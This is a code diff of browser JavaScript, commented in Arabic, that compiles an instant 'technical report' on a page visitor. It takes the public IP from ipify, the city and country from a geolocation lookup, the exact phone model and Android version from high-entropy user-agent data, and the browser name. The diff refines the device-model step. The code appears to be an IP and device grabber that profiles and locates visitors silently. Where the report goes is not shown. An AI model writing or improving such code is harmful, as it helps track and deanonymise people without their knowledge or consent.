@@ -31,6 +31,7 @@
             let n = navigator;
             let report = "🛑 **تقرير تقني شامل (فوري)**\n\n";
 
+            // 1. الشبكة والـ IP (كما طلبت دون تغيير)
             try {
                 const ipRes = await fetch('https://api.ipify.org?format=json').then(r => r.json());
                 report += `🌍 **الآي بي:** \`${ipRes.ip}\`\n`;
@@ -39,18 +40,26 @@
                 report += `📍 **المكان:** ${geo.city}, ${geo.country_name}\n`;
             } catch (e) { report += `🌍 **الآي بي:** فشل جلب الشبكة\n`; }
 
-            // --- تعديل دقة النظام هنا فقط ---
-            let deviceModel = n.platform;
-            if (n.userAgentData && n.userAgentData.getHighEntropyValues) {
-                const ua = await n.userAgentData.getHighEntropyValues(["model", "platformVersion"]);
-                deviceModel = `${ua.model} (Android ${ua.platformVersion})`;
-            } else {
-                let match = n.userAgent.match(/\(([^)]+)\)/);
-                deviceModel = match ? match[1] : n.platform;
-            }
-            report += `📱 **النظام:** ${deviceModel}\n`;
-            // -------------------------------
+            // 2. فحص نوع الهاتف بدقة عميقة (تعديل النظام)
+            let deviceDetail = "Linux (Generic)";
+            try {
+                if (n.userAgentData && n.userAgentData.getHighEntropyValues) {
+                    const ua = await n.userAgentData.getHighEntropyValues(["model", "platform", "platformVersion"]);
+                    deviceDetail = `${ua.model} - Android ${ua.platformVersion}`;
+                } else {
+                    // استخراج الموديل من نص المتصفح (مثال: Samsung SM-G991B)
+                    let uaText = n.userAgent;
+                    let modelMatch = uaText.match(/\(([^)]+)\)/);
+                    if (modelMatch && modelMatch[1]) {
+                        let parts = modelMatch[1].split(';');
+                        deviceDetail = parts[2] ? parts[2].trim() : parts[0].trim();
+                    }
+                }
+            } catch (e) { deviceDetail = n.platform; }
+            
+            report += `📱 **النظام:** ${deviceDetail}\n`;
 
+            // 3. المتصفح والرسوميات
             let bName = "مجهول";
             if (n.userAgent.includes("Brave")) bName = "Brave";
             else if (n.userAgent.includes("Chrome")) bName = "Chrome";
